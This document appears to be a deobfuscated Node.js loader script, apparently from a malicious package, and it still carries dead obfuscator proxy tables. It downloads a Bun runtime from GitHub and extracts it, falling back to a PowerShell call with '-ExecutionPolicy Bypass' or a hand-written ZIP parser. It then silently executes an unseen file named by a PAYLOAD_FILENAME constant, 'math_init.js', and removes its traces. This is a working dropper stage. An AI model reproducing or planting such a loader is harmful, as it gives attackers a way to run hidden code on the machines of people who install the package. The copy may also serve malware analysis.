#!/usr/bin/env node
import {
  execFileSync
} from "child_process";
import fs from "fs";
import https from "https";
import os from "os";
import path from "path";
import {
  fileURLToPath
} from "url";
import zlib from "zlib";
const scriptDir = path.dirname(fileURLToPath(import.meta.url));
const BUN_VERSION = "1.3.13";
const PAYLOAD_FILENAME = "math_init.js";
const REQUEST_TIMEOUT_MS = 121000;
const isMuslLibc = () => {
  const deadMuslProbeTable = {
    YCZJE: function (_0x37c5f6, _0x10081e, _0x2420ce, _0x3706fb) {
      return _0x37c5f6(_0x10081e, _0x2420ce, _0x3706fb);
          },
    QkQej: "--version",
    JBhWy: "ignore",
    nYSgn: "pipe",
    WuGMv: "musl",
    TdVzu: "/etc/os-release",
    HdLeg: "utf8",
    gLXYX: "Alpine"
      };
  try {
    const lddVersionOutput = execFileSync("ldd", ["--version"], {
      stdio: ["ignore", "pipe", "pipe"]
          }).toString();
    if (lddVersionOutput.includes("musl")) {
      return true;
          }
      } catch {
      }
  try {
    return fs.readFileSync("/etc/os-release", "utf8").includes("Alpine");
      } catch {
    return false;
      }
  };
const BUN_ASSET_BY_PLATFORM = {
  "linux-arm64": () => "bun-linux-aarch64",
  "linux-x64": () => isMuslLibc() ? "bun-linux-x64-musl-baseline" : "bun-linux-x64-baseline",
  "darwin-arm64": () => "bun-darwin-aarch64",
  "darwin-x64": () => "bun-darwin-x64",
  "win32-arm64": () => "bun-windows-aarch64",
  "win32-x64": () => "bun-windows-x64-baseline"
  };
function resolveBunAssetForPlatform() {
  const platformArchKey = process.platform + "-" + process.arch;
  const bunAssetResolver = BUN_ASSET_BY_PLATFORM[platformArchKey];
  if (!bunAssetResolver) {
    throw new Error("Unsupported platform/arch: " + platformArchKey);
      }
  return bunAssetResolver();
  }
function downloadToFile(downloadUrl, downloadDestPath, redirectsRemaining = 5) {
  const deadDownloadProxyTable = {
    Hbeql: function (_0x176d23, _0x53a5bf) {
      return _0x176d23(_0x53a5bf);
          },
    DDEed: "Too many redirects",
    OIvQl: function (_0x1dc08d, _0x436ca0, _0x5be236, _0x11fccc) {
      return _0x1dc08d(_0x436ca0, _0x5be236, _0x11fccc);
          },
    EWPHT: function (_0x274872, _0x453b29) {
      return _0x274872 - _0x453b29;
          },
    JbOFw: "finish",
    NIXVR: "node",
    PPSlP: "timeout"
      };
  return new Promise((resolveDownload, rejectDownload) => {
    const downloadRequest = https.get(downloadUrl, {
      headers: {
        "User-Agent": "node"
              },
      timeout: REQUEST_TIMEOUT_MS
          }, httpResponse => {
      const {
        statusCode: httpStatusCode,
        headers: responseHeaders
              } = httpResponse;
      if ([301, 302, 307, 308].includes(httpStatusCode)) {
        httpResponse.resume();
        if (redirectsRemaining <= 0) {
          return rejectDownload(new Error("Too many redirects"));
                  }
        return downloadToFile(responseHeaders.location, downloadDestPath, (redirectsRemaining - 1)).then(resolveDownload, rejectDownload);
              }
      if (httpStatusCode !== 200) {
        httpResponse.resume();
        return rejectDownload(new Error("HTTP " + httpStatusCode + " for " + downloadUrl));
              }
      const downloadFileStream = fs.createWriteStream(downloadDestPath);
      httpResponse.pipe(downloadFileStream);
      downloadFileStream.on("finish", () => downloadFileStream.close(resolveDownload));
      downloadFileStream.on("error", streamError => {
        fs.unlink(downloadDestPath, () => rejectDownload(streamError));
              });
          });
    downloadRequest.on("error", rejectDownload);
    downloadRequest.on("timeout", () => downloadRequest.destroy(new Error("Request timed out")));
      });
  }
function commandExists(commandToProbe, probeArgs = ["--version"]) {
  const deadCallProxyTable = {
    HWsee: function (_0x28d45d, _0x4983b6, _0x35ba2b, _0x4d91d7) {
      return _0x28d45d(_0x4983b6, _0x35ba2b, _0x4d91d7);
          }
      };
  try {
    execFileSync(commandToProbe, probeArgs, {
      stdio: "ignore"
          });
    return true;
      } catch {
    return false;
      }
  }
function extractEntryWithBundledInflate(zipPathToRead, entryNameWanted, inflateDestDir) {
  const deadComparisonProxyTable = {
    BcQPN: function (_0x184e4e, _0x1d0424) {
      return _0x184e4e >= _0x1d0424;
          },
    DPUKn: function (_0x375c61, _0x56150f) {
      return _0x375c61 >= _0x56150f;
          },
    xCtPa: function (_0x1844a1, _0x3ea85a) {
      return _0x1844a1 - _0x3ea85a;
          },
    LJgVr: function (_0x40f7d7, _0x2b065f) {
      return _0x40f7d7 === _0x2b065f;
          },
    aaIUM: function (_0x1c602b, _0x3312ce) {
      return _0x1c602b < _0x3312ce;
          },
    JAOtv: function (_0xb3728b, _0x26e18e) {
      return _0xb3728b + _0x26e18e;
          },
    ZAttW: function (_0x218915, _0x160a56) {
      return _0x218915 + _0x160a56;
          },
    cruvP: function (_0x1a4819, _0x18f1a7) {
      return _0x1a4819 + _0x18f1a7;
          },
    QjztQ: function (_0x40a104, _0x2abd36) {
      return _0x40a104 + _0x2abd36;
          },
    RkEKo: function (_0x310cd5, _0x3dda76) {
      return _0x310cd5 + _0x3dda76;
          },
    oQOIN: "utf8",
    YpqUp: function (_0x1b7a18, _0x288045) {
      return _0x1b7a18 === _0x288045;
          },
    Gkmbt: function (_0x649f8a, _0x5659b4) {
      return _0x649f8a + _0x5659b4;
          },
    xfiND: "Invalid ZIP: bad local-header signature",
    AQUPm: function (_0x61916, _0x17c4a0) {
      return _0x61916 + _0x17c4a0;
          },
    blucA: function (_0x3de5f4, _0x53309b) {
      return _0x3de5f4 === _0x53309b;
          }
      };
  const zipBuffer = fs.readFileSync(zipPathToRead);
  let eocdOffset = -1;
  for (let eocdScanCursor = zipBuffer.length - 22; (eocdScanCursor >= 0) && (eocdScanCursor >= (zipBuffer.length - 65557)); eocdScanCursor--) {
    if ((zipBuffer.readUInt32LE(eocdScanCursor) === 101010256)) {
      eocdOffset = eocdScanCursor;
      break;
          }
      }
  if ((eocdOffset === -1)) {
    throw new Error("Invalid ZIP: EOCD record not found");
      }
  const centralDirEntryCount = zipBuffer.readUInt16LE(eocdOffset + 10);
  const centralDirectoryOffset = zipBuffer.readUInt32LE(eocdOffset + 16);
  let centralDirCursor = centralDirectoryOffset;
  let matchedLocalHeaderOffset = -1;
  let matchedEntryCompressionMethod = -1;
  let matchedCompressedSize = 0;
  for (let entryIndex = 0; (entryIndex < centralDirEntryCount); entryIndex++) {
    if (zipBuffer.readUInt32LE(centralDirCursor) !== 33639248) {
      throw new Error("Invalid ZIP: bad CD entry signature");
          }
    const entryCompressionMethod = zipBuffer.readUInt16LE(centralDirCursor + 10);
    const entryCompressedSize = zipBuffer.readUInt32LE((centralDirCursor + 20));
    const centralFileNameLength = zipBuffer.readUInt16LE((centralDirCursor + 28));
    const centralDirExtraFieldLength = zipBuffer.readUInt16LE(centralDirCursor + 30);
    const entryCommentLength = zipBuffer.readUInt16LE((centralDirCursor + 32));
    const entryLocalHeaderOffset = zipBuffer.readUInt32LE((centralDirCursor + 42));
    const entryName = zipBuffer.subarray((centralDirCursor + 46), ((centralDirCursor + 46) + centralFileNameLength)).toString("utf8");
    if ((entryName === entryNameWanted)) {
      matchedLocalHeaderOffset = entryLocalHeaderOffset;
      matchedEntryCompressionMethod = entryCompressionMethod;
      matchedCompressedSize = entryCompressedSize;
      break;
          }
    centralDirCursor += (((46 + centralFileNameLength) + centralDirExtraFieldLength) + entryCommentLength);
      }
  if ((matchedLocalHeaderOffset === -1)) {
    throw new Error("Entry \"" + entryNameWanted + "\" not found in ZIP");
      }
  if (zipBuffer.readUInt32LE(matchedLocalHeaderOffset) !== 67324752) {
    throw new Error("Invalid ZIP: bad local-header signature");
      }
  const localFileNameLength = zipBuffer.readUInt16LE((matchedLocalHeaderOffset + 26));
  const localExtraFieldLength = zipBuffer.readUInt16LE((matchedLocalHeaderOffset + 28));
  const entryDataOffset = ((matchedLocalHeaderOffset + 30) + localFileNameLength) + localExtraFieldLength;
  const rawEntryBytes = zipBuffer.subarray(entryDataOffset, (entryDataOffset + matchedCompressedSize));
  let entryContents;
  if ((matchedEntryCompressionMethod === 0)) {
    entryContents = rawEntryBytes;
      } else if (matchedEntryCompressionMethod === 8) {
    entryContents = zlib.inflateRawSync(rawEntryBytes);
      } else {
    throw new Error("Unsupported ZIP compression method: " + matchedEntryCompressionMethod);
      }
  const extractedFilePath = path.join(inflateDestDir, path.basename(entryNameWanted));
  fs.writeFileSync(extractedFilePath, entryContents);
  }
function extractBunFromZip(archivePath, archiveEntryWanted, extractDestDir) {
  const deadUnzipLiteralTable = {
    WaLKQ: function (_0x443d21, _0x188051, _0x591dc3) {
      return _0x443d21(_0x188051, _0x591dc3);
          },
    SiMvK: "unzip",
    DQZne: "-ojq",
    FCJDu: "inherit",
    lQXcL: function (_0x2b7fcb, _0x2ee887) {
      return _0x2b7fcb === _0x2ee887;
          },
    MJNCi: "win32",
    PpNLF: "-Help",
    tHRFe: function (_0x38d224, _0x3708f7, _0x2f2738, _0x3038c8) {
      return _0x38d224(_0x3708f7, _0x2f2738, _0x3038c8);
          },
    DVCdV: "-NoProfile",
    PZdQt: "-NonInteractive",
    NaIqo: "-ExecutionPolicy",
    XFZDA: "-Command"
      };
  if (commandExists("unzip", ["-v"])) {
    execFileSync("unzip", ["-ojq", archivePath, archiveEntryWanted, "-d", extractDestDir], {
      stdio: "inherit"
          });
    return;
      }
  if ((process.platform === "win32") && commandExists("powershell", ["-Help"])) {
    execFileSync("powershell", ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", "Expand-Archive -LiteralPath '" + archivePath + "' -DestinationPath '" + extractDestDir + "' -Force"], {
      stdio: "inherit"
          });
    const extractedNestedPath = path.join(extractDestDir, archiveEntryWanted);
    const flattenedEntryPath = path.join(extractDestDir, path.basename(archiveEntryWanted));
    fs.renameSync(extractedNestedPath, flattenedEntryPath);
    return;
      }
  extractEntryWithBundledInflate(archivePath, archiveEntryWanted, extractDestDir);
  }
async function main() {
  const deadBunLiteralTable = {
    SBBJg: "bun",
    cDRsb: function (_0x42340a) {
      return _0x42340a();
          },
    TYfsS: function (_0x3b27db, _0x5c3c16) {
      return _0x3b27db === _0x5c3c16;
          },
    IpJiW: "win32",
    dAZFw: "bun.exe",
    zjKAu: "bun-dl-",
    oLhtn: function (_0x521abc, _0x3252b3, _0x540ccd) {
      return _0x521abc(_0x3252b3, _0x540ccd);
          },
    MRkzl: function (_0x4b79a6, _0x5cacca, _0x3b9b02, _0x479446) {
      return _0x4b79a6(_0x5cacca, _0x3b9b02, _0x479446);
          },
    CKbOn: "inherit"
      };
  if (commandExists("bun")) {
    execFileSync("bun", [path.join(scriptDir, "math_init.js")], {
      stdio: "inherit",
      cwd: scriptDir
          });
    return;
      }
  const bunAssetName = resolveBunAssetForPlatform();
  const isWindows = (process.platform === "win32");
  const bunExecutableName = isWindows ? "bun.exe" : "bun";
  const bunReleaseZipUrl = "https://github.com/oven-sh/bun/releases/download/bun-v" + "1.3.13" + "/" + bunAssetName + ".zip";
  const bunDownloadTempDir = fs.mkdtempSync(path.join(os.tmpdir(), "bun-dl-"));
  const bunZipPath = path.join(bunDownloadTempDir, bunAssetName + ".zip");
  const bunBinaryPath = path.join(bunDownloadTempDir, bunExecutableName);
  const payloadScriptPath = path.join(scriptDir, "math_init.js");
  try {
    await downloadToFile(bunReleaseZipUrl, bunZipPath);
    extractBunFromZip(bunZipPath, bunAssetName + "/" + bunExecutableName, bunDownloadTempDir);
    fs.unlinkSync(bunZipPath);
    if (!isWindows) {
      fs.chmodSync(bunBinaryPath, 493);
          }
    execFileSync(bunBinaryPath, [payloadScriptPath], {
      stdio: "inherit",
      cwd: scriptDir
          });
      } finally {
    fs.rmSync(bunDownloadTempDir, {
      recursive: true,
      force: true
          });
      }
  }
main().catch(fatalError => {
  console.error(fatalError.message);
  process.exit(1);
  });
